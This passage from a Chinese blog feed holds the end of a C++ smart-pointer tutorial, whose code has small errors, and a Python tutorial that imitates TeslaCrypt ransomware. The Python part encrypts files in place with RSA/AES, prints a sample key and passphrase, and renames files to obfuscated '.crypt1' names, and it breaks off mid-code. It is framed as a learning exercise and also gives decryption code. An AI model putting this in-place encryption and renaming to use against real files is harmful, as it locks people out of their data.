<h1 id="3-1-基础对象类"><a href="#3-1-基础对象类" class="headerlink" title="3.1 基础对象类"></a>3.1 基础对象类</h1><p>首先，我们来定义一个基础对象类Student类，这个是我们实际使用的对象，我们为Student类创建如下接口：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> Student                                       </div><div class="line">&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    Student()&#123; <span class="built_in">cout</span>&lt;&lt;<span class="string">"Student()"</span>; &#125;</div><div class="line">    ~Student()&#123; <span class="built_in">cout</span>&lt;&lt;<span class="string">"~Student()"</span>;&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="3-2-辅助管理类"><a href="#3-2-辅助管理类" class="headerlink" title="3.2 辅助管理类"></a>3.2 辅助管理类</h1><p>在创建<code>智能指针类</code>之前，我们先创建一个辅助管理类。这个类的所有成员皆为私有类型，因为它不被普通用户所使用。为了只为智能指针使用，还需要把智能指针类声明为辅助类的友元。<br>这个辅助类含有两个数据成员：<code>引用计数count</code>与<code>基础对象指针</code>。也即辅助类用以封装使用计数与基础对象指针。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="keyword">class</span> U_Ptr                                  </div><div class="line">&#123;</div><div class="line"><span class="keyword">private</span>:</div><div class="line">    </div><div class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> SmartPtr;                      <span class="comment">//友元类能直接操作U_Ptr类成员</span></div><div class="line">    U_Ptr(T *ptr) :p(ptr), count(<span class="number">1</span>) &#123; &#125;         <span class="comment">//初始化1</span></div><div class="line">    ~U_Ptr() &#123; <span class="keyword">delete</span> p; &#125;                      <span class="comment">//虚析构函数</span></div><div class="line">    </div><div class="line">    <span class="keyword">int</span> count;                      <span class="comment">// 引用计数</span></div><div class="line">    T *p;                           <span class="comment">// 实际的对象                                        </span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="3-3-智能指针类"><a href="#3-3-智能指针类" class="headerlink" title="3.3 智能指针类"></a>3.3 智能指针类</h1><p>设计一个智能指针类SmartPtr类，我们这里只关注rp指针和构造函数、析构函数。<br>rp是基础管理类，SmartPtr类通过rp来间接增加或者减少引用计数count，当引用计数为0，则delete rp，而rp的析构函数，会去释放真正的对象。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="keyword">class</span> SmartPtr</div><div class="line">&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    SmartPtr(T *ptr) :rp(<span class="keyword">new</span> U_Ptr(ptr)) &#123; &#125;      <span class="comment">//构造函数</span></div><div class="line">    SmartPtr(<span class="keyword">const</span> SmartPtr &amp;sp) :rp(sp.rp) &#123; ++rp-&gt;count; &#125; <span class="comment">//复制构造函数</span></div><div class="line">    SmartPtr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> SmartPtr&amp; rhs) &#123;               <span class="comment">//赋值函数</span></div><div class="line">        ++rhs.rp-&gt;count;    </div><div class="line">        <span class="keyword">if</span> (--rp-&gt;count == <span class="number">0</span>)    </div><div class="line">            <span class="keyword">delete</span> rp;</div><div class="line">        rp = rhs.rp;</div><div class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    ~SmartPtr() &#123;                           <span class="comment">//析构函数（虚函数）       </span></div><div class="line">        <span class="keyword">if</span> (--rp-&gt;count == <span class="number">0</span>)   </div><div class="line">            <span class="keyword">delete</span> rp;</div><div class="line">        <span class="keyword">else</span> </div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"还有"</span> &lt;&lt; rp-&gt;count &lt;&lt; <span class="string">"个指针指向基础对象"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line"><span class="keyword">private</span>:</div><div class="line">        U_Ptr *rp;  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h1 id="四、使用示例"><a href="#四、使用示例" class="headerlink" title="四、使用示例"></a>四、使用示例</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">//定义一个基础对象类指针</span></div><div class="line">    Student *pS = <span class="keyword">new</span> Student();</div><div class="line"></div><div class="line">    <span class="comment">//定义三个智能指针类对象，对象都指向基础类对象pa</span></div><div class="line">    <span class="comment">//使用花括号控制三个指针指针的生命期，观察计数的变化</span></div><div class="line"></div><div class="line">    &#123;</div><div class="line">        SmartPtr&lt;Student&gt; sptr1(pS);<span class="comment">//此时计数count=1</span></div><div class="line">        &#123;</div><div class="line">            SmartPtr&lt;Student&gt; sptr2(sptr1); <span class="comment">//调用复制构造函数，此时计数为count=2</span></div><div class="line">            &#123;</div><div class="line">                SmartPtr&lt;Student&gt; sptr3=sptr1; <span class="comment">//调用赋值操作符，此时计数为conut=3</span></div><div class="line">            &#125;</div><div class="line">            <span class="comment">//此时count=2</span></div><div class="line">        &#125;</div><div class="line">        <span class="comment">//此时count=1；</span></div><div class="line">    &#125;</div><div class="line">    <span class="comment">//此时count=0；pS对象被delete掉</span></div><div class="line"></div><div class="line">    system(<span class="string">"pause"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>引用计数实现的方式多种多样，上面是一种比较简单的参考实现。</p>
<h1 id="五、Android智能指针"><a href="#五、Android智能指针" class="headerlink" title="五、Android智能指针"></a>五、Android智能指针</h1><p>原始的引用计数无法解决循环引用问题。什么是循环引用？举一个简单例子：</p>
<blockquote>
<p>系统中有两个对象A和B，在对象A的内部引用了对象B，而在对象B的内部也引用了对象A。当两个对象A和B都不再使用时，垃圾收集系统会发现无法回收这两个对象的所占据的内存的，因为系统一次只能收集一个对象，而无论系统决定要收回对象A还是要收回对象B时，都会发现这个对象被其它的对象所引用，因而就都回收不了，这样就造成了内存泄漏。</p>
</blockquote>
<p>这样，就要采取另外的一种引用计数技术了，即对象的引用计数同时存在强引用和弱引用两种计数。比如Android的智能指针。</p>
<h2 id="5-1-强指针和弱指针"><a href="#5-1-强指针和弱指针" class="headerlink" title="5.1 强指针和弱指针"></a>5.1 强指针和弱指针</h2><p>Android中定义了两种智能指针类型，一种是强指针sp（strong pointer），一种是弱指针（weak pointer）。其实成为强引用和弱引用更合适一些。强指针与一般意义的智能指针概念相同，通过引用计数来记录有多少使用者在使用一个对象，如果所有使用者都放弃了对该对象的引用，则该对象将被自动销毁。</p>
<p>弱指针也指向一个对象，但是弱指针仅仅记录该对象的地址，不能通过弱指针来访问该对象，也就是说不能通过弱智真来调用对象的成员函数或访问对象的成员变量。要想访问弱指针所指向的对象，需首先将弱指针升级为强指针（通过wp类所提供的promote()方法）。弱指针所指向的对象是有可能在其它地方被销毁的，如果对象已经被销毁，wp的promote()方法将返回空指针，这样就能避免出现地址访问错的情况。</p>
<p>每一个可以被智能指针引用的对象都同时被附加了另外一个 weakref_impl类型的对象，这个对象中负责记录对象的强指针引用计数和弱指针引用计数。这个对象是Android智能指针的实现内部使用的，智能指针的使用者看不到这个对象。弱指针操作的就是这个对象，只有当强引用计数和弱引用计数都为0时，这个对象才会被销毁。</p>
<h2 id="5-2-使用Android智能指针"><a href="#5-2-使用Android智能指针" class="headerlink" title="5.2 使用Android智能指针"></a>5.2 使用Android智能指针</h2><p>假如我有一个类MyClass要使用智能指针，那么需要满足两个条件：</p>
<ul>
<li>（1） 这个类是RefBase的子类或间接子类；</li>
<li>（2） 这个类必须定义<code>虚</code>构造函数 :  <code>~MyClass(){}</code></li>
</ul>
<h3 id="强指针"><a href="#强指针" class="headerlink" title="强指针"></a>强指针</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sp&lt; MyClass&gt; p_obj = <span class="keyword">new</span> MyClass(); </div><div class="line">p_obj-&gt;func()</div></pre></td></tr></table></figure>
<h3 id="弱指针"><a href="#弱指针" class="headerlink" title="弱指针"></a>弱指针</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wp&lt; MyClass&gt; wp_obj = <span class="keyword">new</span> MyClass();  </div><div class="line">p_obj = wp_obj.promote();    <span class="comment">// 用.而不是-&gt;  </span></div><div class="line">p_obj-&gt;func();</div></pre></td></tr></table></figure>
<p>相关源码：</p>
<ul>
<li><a href="http://androidxref.com/4.4_r1/xref/system/core/include/utils/RefBase.h" target="_blank" rel="external">http://androidxref.com/4.4_r1/xref/system/core/include/utils/RefBase.h</a></li>
<li><a href="http://androidxref.com/4.4_r1/xref/system/core/include/utils/StrongPointer.h" target="_blank" rel="external">http://androidxref.com/4.4_r1/xref/system/core/include/utils/StrongPointer.h</a></li>
</ul>
<p>如果需要了解Android智能指针的实现，可以参考老罗的一篇文章：<br><a href="http://blog.csdn.net/luoshengyang/article/details/6786239" target="_blank" rel="external">http://blog.csdn.net/luoshengyang/article/details/6786239</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;引用计数机制&lt;/p&gt;
&lt;p&gt;以前学cocos写游戏的时候有接触过这个概念。&lt;/p&gt;
&lt;p&gt;引用计数是计算机编程语言中的一种内存管理技术，是指将资源（可以是对象、内存或磁盘空间等等）的被引用次数保存起来，当被引用次数变为零时就将其释放的过程。使用引用计数技术可以实现自动资源管理的目的。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Android智能指针" scheme="https://maoao530.github.io/tags/Android%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>Python RSA文件加密</title>
    <link href="https://maoao530.github.io/2016/11/20/python-rsa/"/>
    <id>https://maoao530.github.io/2016/11/20/python-rsa/</id>
    <published>2016-11-20T13:51:47.000Z</published>
    <updated>2017-01-31T07:19:01.879Z</updated>
    
    <content type="html"><![CDATA[<p>本文教你如何用Python对文件进行不对称加密。</p>
<a id="more"></a>
<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>前段时间，一个同学找到我说他的电脑中病毒了，电脑上所有重要的文件都变成了<em>*</em>.cryp1，打也打不开，大学生涯的重要文件都没有了，很着急所以让我帮忙看看。嗯，作为程序员的觉悟，第一反应就是开始找资料，看看这个是什么鬼。</p>
<p>Google了一番后，发现这个病毒的名字叫特斯拉勒索者，会把你电脑上的一些文件进行加密，变成<em>*</em>.cryp1，并留下一个比特币支付的链接，让你打钱过去，不打钱就不给你解密的方法，那么如果你中毒了，那么只能恭喜你了！因为除了作者把私钥放出来，否则基本上没有破解的可能。</p>
<p>为什么这么说呢？病毒会对文件进行不对称加密，也就是公钥加密算法。只要保证你的密钥长度足够长，那么基本上就没有破解的可能。为什么这么说呢？你可以想象一下银行卡交易被破解的后果。</p>
<h1 id="二、RSA简介"><a href="#二、RSA简介" class="headerlink" title="二、RSA简介"></a>二、RSA简介</h1><p>RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。</p>
<p>RSA算法的原理，目前网络上有许多优秀的文章，特别推荐阅读阮一峰老师的文章：</p>
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="external">RSA算法原理1</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="external">RSA算法原理2</a></li>
</ul>
<p>本文主要描述如何使用RSA来对文件进行不对成加密。</p>
<h1 id="三、PyCrypto"><a href="#三、PyCrypto" class="headerlink" title="三、PyCrypto"></a>三、PyCrypto</h1><p>PyCrypto是Python中密码学方面比较有名的第三方软件包。可惜的是，它的开发工作于 2012 年就已停止。幸运的是，有一个该项目的分支 PyCrytodome 取代了PyCrypto，可以支持Python3.5，在Windows上，我们可以直接安装：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">py <span class="number">-3</span> -m pip install PyCrytodome</div></pre></td></tr></table></figure>
<p>相关文档可以直接访问：</p>
<ul>
<li><a href="http://pycryptodome.readthedocs.io/en/latest/src/examples.html" target="_blank" rel="external">例子说明</a></li>
<li><a href="http://legrandin.github.io/pycryptodome/Doc/3.4/" target="_blank" rel="external">API说明</a></li>
</ul>
<h1 id="四、文件加密"><a href="#四、文件加密" class="headerlink" title="四、文件加密"></a>四、文件加密</h1><p>准备好环境之后，那么我们现在来开始模拟<code>黑客</code>对文件进行加密处理吧！！<br>如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。</p>
<h2 id="4-1-生成公钥和私钥"><a href="#4-1-生成公钥和私钥" class="headerlink" title="4.1 生成公钥和私钥"></a>4.1 生成公钥和私钥</h2><p>在这个例子中，我们将生成自己的密钥对。创建 RSA 密钥非常容易：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateRSAKeys</span><span class="params">()</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    <span class="comment"># 生成 2048 位的 RSA 密钥</span></div><div class="line">    key = RSA.generate(<span class="number">2048</span>)</div><div class="line">    encrypted_key = key.exportKey(passphrase=code, pkcs=<span class="number">8</span>, protection=<span class="string">"scryptAndAES128-CBC"</span>)</div><div class="line">    <span class="comment"># 生成私钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_private_rsa_key.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(encrypted_key)</div><div class="line">    <span class="comment"># 生成公钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_rsa_public.pem'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(key.publickey().exportKey())</div></pre></td></tr></table></figure>
<p>当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。</p>
<p>公钥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-----BEGIN RSA PUBLIC KEY-----</div><div class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzVRRmo7R3VPtsUz/uBBi</div><div class="line">/Ofb/5NKMoylH6xnFfH3WaN8oTj9706xxrNmuJ0kc4QVNDofKKogfotjVRDbe6FT</div><div class="line">7JoH9NclCNEvfiaOWnwXV6srPYBfQb7pCl4cfQ23U/EOFR2SRAIO9yYy5z8vToG3</div><div class="line">shSPKcs3dXGfnzYaJcvCwcG8Dmk09S2wLTdo7ZqPp5erG5eYa2ohV0B94SQyHvUk</div><div class="line">Bl5iYlkH0zUdnif7u47xziAM2HtWB2xMB7l3ckaltuN6qPvXkyaz50HUTbZRhVFn</div><div class="line">iHd5iaseAYxD74uLw5TYmj8s5A33lPO4oJe868ukgUl0DMSF48OX2OO4TrhYZEFJ</div><div class="line">BwIDAQAB</div><div class="line">-----END RSA PUBLIC KEY-----</div></pre></td></tr></table></figure></p>
<p>私钥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">-----BEGIN ENCRYPTED PRIVATE KEY-----</div><div class="line">MIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQI2zONWIfQCF4CAkAA</div><div class="line">AgEIAgEBMB0GCWCGSAFlAwQBAgQQLRSUFPMMc6Zds4C/tu2lKwSCBNDtbdkpf3un</div><div class="line">1hQz8nJ0x91m6FH3esDz+IGSjVBMFAT0uy5TiKv/2u3glj+sgFEM7aLOeaX3Qouk</div><div class="line">kEm5L73J28qEeZ3hqNoaMmYdzAaHuCOjHubXaii3AoKTg4PXO9Qy4v/IICTj5CQq</div><div class="line">SMSSFXlkSmfz7u4WzwQzM1LOwSwLuHVJElVCxiOBA7m4dJgNNd6iRIPyTLh2ECiK</div><div class="line">wrMgkaGbQIxYN7RMt9tm2cL5z6Ah8sRBjlDbM1QSnOEyY9NPrWqHyT/R1enjLkQp</div><div class="line">DiZUtxp5A9yjE1QEiKBvqIKTMDhGcXK1S7KXo7DWYOMpU1zZp0dLWKFmyNmi6b9H</div><div class="line">tu/HYFcV6pDDA3x+yVnDZsxcDJ/iaJJ7v6qFI04dukVbkr977PHTaUj9AbmQZf/K</div><div class="line">hnBr2BmL65h84oPhnxVk50g//DAiorPUZ5BEFNdOExlW/eiUezG+n86vtqd3VFYZ</div><div class="line">/LMlse6C+fLiwHRTbbJx2jRiIbpcBOdUcqLxdjUsFiUtuwZeh9A/9Zu3GJjd0kp2</div><div class="line">Itp1I9wrI9l56msSfO6n5//11Jjtc1ANxcJY9np1julboEyhS5H25PojXL7moUy5</div><div class="line">yWbzPe9I9xodLJGIpa0FqmEM2O0AuV4CCO3QzbVMc3fOY264wxHnIMhMhQocD9dy</div><div class="line">R1TNtfb3A5Hsj3nLVcFgpUj9WdrHfmxPAgcY2LCSxVhrKaitjUMDi3ea5G5G6DeZ</div><div class="line">f5/+Vc0M4gxyeyn7fp5DY6AEdNea2P+4UPsXdUw74jExHiYv0Zx07kGjM9Qwvg9f</div><div class="line">GUhDJvMtxuFGjBqy4wnYwGx3PvHPljONPhxpE2naXlhjsi0K39Q6P+o+bTYOBZBl</div><div class="line">icdup4feaZ9AtcN8fU3kFKPnkbQ9fLwTGA8UuJAguBW95jJ5trT8tmn4o0y3O61f</div><div class="line">nGyN3JyzwaI/fPi8QavqUti3cSTxcYDr9oXBU1ND9YLB8LKgnXE9LD3kg0a6w6kE</div><div class="line">dJPpf9OTeMFb85wf/bEviof0CgK/fGcz9DxuRvJLRLPwTfXXh3stZ33Rky/MuX1h</div><div class="line">5qmd7eDXEZmFWvi73P5R61+xGHxgarP9Ww7bX6EcC7HN9xg2QcWHDusdWaw/HE9J</div><div class="line">1pHxCzOQoxE4SclqEtTo3J9fXhQgKfKih7azWP1PpTsjvZ/J4ZwZeGWUDXzk54op</div><div class="line">Dg8PFEhAPsyRt94iKP+oKb3zHYpkcuU4UAk8+fPznZ+1hIvboryn3CfV6t29dyGE</div><div class="line">9R3VCCPLBrpy4DJhvuITjlZdeh6fhUV4SOXjUBEhNn+6wv3L3U3INvXIwfJssAf+</div><div class="line">boXk4lf209HcGz05Q6dFyN106q7UjWK/e+ometiD/wL51DoRBnS5CfrW9U1o4m4P</div><div class="line">I23mKeoaf0i7SoPz2vVF7w7vEzXXgk7wO4bN0AqeFjCMFw/hOQqZrNHcIWchsmiP</div><div class="line">wCqwj/FSGHIzGvppbTPr8qudMlXmaL1xGbyJAOAJW+qVaEwzJx7wvrchehGwzYbI</div><div class="line">YuGuWfYqKIh4+1VgQyafDuO13o5TeqdZa3ghgWiRpJse7KabbVgHLyBfxMvVuIpH</div><div class="line">qpM3qaTqsp4CICPuCFVoB5HReu0V7l1gfN++Tjo5BLV5rijyhWjnlUDRXqntnXqA</div><div class="line">2RC9vOpNMZ6L8Fp6VvA9i3ZI9RvkkeI2rw==</div><div class="line">-----END ENCRYPTED PRIVATE KEY-----</div></pre></td></tr></table></figure></p>
<p>当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。</p>
<h2 id="4-2-利用公钥对文件进行加密"><a href="#4-2-利用公钥对文件进行加密" class="headerlink" title="4.2 利用公钥对文件进行加密"></a>4.2 利用公钥对文件进行加密</h2><p>现在我们来看看如何对文件进行加密处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</div><div class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(filename)</span>:</span>         </div><div class="line">    data = <span class="string">''</span></div><div class="line">    <span class="comment"># 二进制只读打开文件，读取文件数据</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">        data = f.read()</div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> out_file:</div><div class="line">        <span class="comment"># 收件人秘钥 - 公钥</span></div><div class="line">        recipient_key = RSA.import_key(open(<span class="string">'my_rsa_public.pem'</span>).read())</div><div class="line">        <span class="comment">#一个 16 字节的会话密钥</span></div><div class="line">        session_key = get_random_bytes(<span class="number">16</span>)</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the session key with the public RSA key</span></div><div class="line">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</div><div class="line">        out_file.write(cipher_rsa.encrypt(session_key))</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the data with the AES session key</span></div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</div><div class="line">       </div><div class="line">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</div><div class="line"></div><div class="line">        out_file.write(cipher_aes.nonce)</div><div class="line">        out_file.write(tag)</div><div class="line">        out_file.write(ciphertext)</div></pre></td></tr></table></figure>
<p>我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。</p>
<p>加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。</p>
<h2 id="4-3-利用私钥对文件进行解密"><a href="#4-3-利用私钥对文件进行解密" class="headerlink" title="4.3 利用私钥对文件进行解密"></a>4.3 利用私钥对文件进行解密</h2><p>现在让我们学习如何解密我们的文件数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Descrypt</span><span class="params">(filename)</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> fobj:</div><div class="line">        <span class="comment"># 导入私钥</span></div><div class="line">        private_key = RSA.import_key(open(<span class="string">'my_private_rsa_key.bin'</span>).read(), passphrase=code)</div><div class="line">        <span class="comment"># 会话密钥， 随机数，消息认证码，机密的数据</span></div><div class="line">        enc_session_key, nonce, tag, ciphertext = [ fobj.read(x) </div><div class="line">                                                    <span class="keyword">for</span> x <span class="keyword">in</span> (private_key.size_in_bytes(), </div><div class="line">                                                    <span class="number">16</span>, <span class="number">16</span>, <span class="number">-1</span>) ]</div><div class="line">        cipher_rsa = PKCS1_OAEP.new(private_key)</div><div class="line">        session_key = cipher_rsa.decrypt(enc_session_key)</div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</div><div class="line">        <span class="comment"># 解密</span></div><div class="line">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</div><div class="line">    </div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> wobj:</div><div class="line">        wobj.write(data)</div></pre></td></tr></table></figure>
<p>我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。</p>
<p>接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。</p>
<p>解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！</p>
<h1 id="五、文件名处理"><a href="#五、文件名处理" class="headerlink" title="五、文件名处理"></a>五、文件名处理</h1><p>当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟黑客的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：</p>
<h2 id="5-1-文件重命名"><a href="#5-1-文件重命名" class="headerlink" title="5.1 文件重命名"></a>5.1 文件重命名</h2><p>举例比如：blog2.rar ==&gt; yFmcuIzZvxmY.crypt1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">RenameFile</span><span class="params">(dir,filename)</span>:</span></div><div class="line">    filename_bytes = filename.encode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">    filename_bytes_base64 = base64.encodestring(filename_bytes)    </div><div class="line">    filename_bytes_base64 = filename_bytes_base64[::<span class="number">-1</span>][<span class="number">1</span>:]   <span class="comment"># 倒序</span></div><div class="line">    </div><div class="line">    new_filename = filename_bytes_base64.decode(<span class="string">'utf-8'</span>) + <span class="string">'.crypt1'</span></div><div class="line">    </div><div class="line">    <span class="comment">#print (new_filename)</span></div><div class="line">    print(os.path.join(dir, filename))</div><div class="line">    print(os.path.join(dir,new_filename))</div><div class="line">    os.rename(os.path.join(dir, filename), 